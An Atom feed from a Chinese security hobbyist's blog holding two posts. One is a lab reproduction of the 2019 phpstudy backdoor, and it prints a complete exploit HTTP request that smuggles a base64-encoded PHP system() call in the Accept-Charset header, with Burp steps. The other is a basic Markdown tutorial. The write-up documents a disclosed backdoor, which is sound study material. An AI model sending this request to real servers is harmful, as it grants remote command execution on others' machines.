<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>逐日的博客</title>
  
  <subtitle>一个信息安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-01T04:41:17.945Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>逐日</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phpstudy后门利用</title>
    <link href="http://yoursite.com/2019/09/29/phpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/09/29/phpstudy后门利用/</id>
    <published>2019-09-29T14:26:13.000Z</published>
    <updated>2019-10-01T04:41:17.945Z</updated>
    
    <content type="html"><![CDATA[<p>之前爆出的phpstudy后门，今天来复现一下</p><p>通过爆出来的信息得知，后门隐藏再PHP文件夹里，版本分别是php-5.217，php-5.4.45。后门代码存在\ext\php_xmlrpc.dll里</p><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-50-28.png?x-oss-process=style/hexo" alt="blockchain"></p><p>我们可以打开文件搜索关键字@eval</p><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-52-32.png?x-oss-process=style/hexo" alt="blockchain"></p><p>发现确实存在后门</p><p>那么上EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /1.php HTTP/1.1</span><br><span class="line">Host: secquan.org</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Accept-Encoding:gzip,deflate</span><br><span class="line">Accept-Charset:这里就是要执行的命令base64加密c3lzdGVtKCdjYWxjLmV4ZScpOw==</span><br><span class="line">Cookie: UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>Accept-Charset就是exp的核心，我们在这里面插入命令，通过base64编码，将包发送给服务器</p><p>开始实验<br>-</p><p>首先我们打开phpstudy，将版本切换为php-5.4.45 + Apache</p><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_09-59-09.png?x-oss-process=style/hexo" alt="blockchain"></p><p>接下来打开burp来抓包</p><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_10-07-39.png?x-oss-process=style/hexo" alt="blockchain"></p><p>然后向数据内插入EXP</p><p>再burp中有编码转换的模块，打开然后开始转换</p><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-17-32.png?x-oss-process=style/hexo" alt="blockchain"></p><p>转换完成后，将其插入语句中</p><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-23-19.png?x-oss-process=style/hexo" alt="blockchain"></p><p>可以看到，代码成功执行了</p><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-24-22.png?x-oss-process=style/hexo" alt="blockchain"></p><blockquote><p>注释:如果你执行失败，就修改一下包内的数据：<code>Accept-Encoding:gzip,deflate</code> 之间不要留空格。<br>再你插入完成的语句的后门按两下回车。类似这样</p></blockquote><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/phpstudy/Snipaste_2019-10-01_12-29-16.png?x-oss-process=style/hexo" alt="blockchain"></p><p>本文到此结束</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前爆出的phpstudy后门，今天来复现一下&lt;/p&gt;
&lt;p&gt;通过爆出来的信息得知，后门隐藏再PHP文件夹里，版本分别是php-5.217，php-5.4.45。后门代码存在\ext\php_xmlrpc.dll里&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://zhur
      
    
    </summary>
    
    
    
      <category term="phpstudy" scheme="http://yoursite.com/tags/phpstudy/"/>
    
  </entry>
  
  <entry>
    <title>Markdown基本用法.md</title>
    <link href="http://yoursite.com/2019/09/28/Markdown%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
    <id>http://yoursite.com/2019/09/28/Markdown基本用法/</id>
    <published>2019-09-28T03:31:32.000Z</published>
    <updated>2019-09-29T14:17:13.770Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><p>也可以使用-来定义<br>一级标题<br>=<br>二级标题<br>-</p><p>这是换行</p><p>当我们需要进行段落强调。</p><blockquote><p>段落强调<br>区块引用</p><blockquote><p>嵌套引用</p><blockquote><p>三嵌套引用</p><blockquote><p>四嵌套引用</p></blockquote></blockquote></blockquote></blockquote><p>代码区块</p><pre><code>#include &lt;stdo.h&gt;int main(){    printf(&quot;这是一串代码&quot;);}return 0;</code></pre><p>再强调类容两侧分别加上<em>或者-,如：<br>*斜体</em> ,<em>斜体<em>。<br><strong>加粗</strong>,__加粗</em></em></p><p>使用+活-标记无序列表</p><ul><li>第一项</li></ul><ul><li>第二项</li></ul><ul><li>第三项</li></ul><ul><li>第四项</li></ul><p>使用有序列表，在前方使用数字标识，例如：</p><ol><li>黄瓜</li><li>玉米</li><li>茄子</li></ol><p>使用列表项中包含多个段落，为了保证渲染正常，*与段落首字母之间必须保留四个空格</p><ul><li>段落一<br>是否可啦啦啦啦啦啦啦啦啦</li><li>段落二<blockquote><p>去快标记<br>阿<br>分割线，加入分割线</p></blockquote></li></ul><hr><hr><p>高级插入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fun (x: Int, y: Int): Int &#123;</span><br><span class="line">  return x + y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>插入图片</p><p><img src="https://zhuri-hexo.oss-cn-beijing.aliyuncs.com/imgs/213207-156665352785d3.jpg" alt="blockchain" title="测试图"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;这是一级标题&quot;&gt;&lt;a href=&quot;#这是一级标题&quot; class=&quot;headerlink&quot; title=&quot;这是一级标题&quot;&gt;&lt;/a&gt;这是一级标题&lt;/h1&gt;&lt;h2 id=&quot;这是二级标题&quot;&gt;&lt;a href=&quot;#这是二级标题&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="Markdown" scheme="http://yoursite.com/tags/Markdown/"/>
    
  </entry>
  
</feed>
